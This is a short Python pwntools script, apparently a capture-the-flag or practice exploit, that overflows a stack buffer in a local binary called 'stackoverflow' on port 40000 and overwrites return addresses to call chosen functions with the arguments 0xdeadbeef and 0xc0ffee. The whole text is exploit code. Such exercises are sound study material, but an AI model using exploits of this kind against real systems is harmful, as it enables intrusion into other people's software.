from pwn import *

#io = process("./stackoverflow")
io = remote("127.0.0.1",40000)

io.recvuntil("name:\n")
#gdb.attach(io)
io.sendline("a" * 0x2c + p32(0x080485df) + p32(0x0804862D) + p32(0xdeadbeef) + p32(0xc0ffee))
print io.recvline()
print io.recvline()
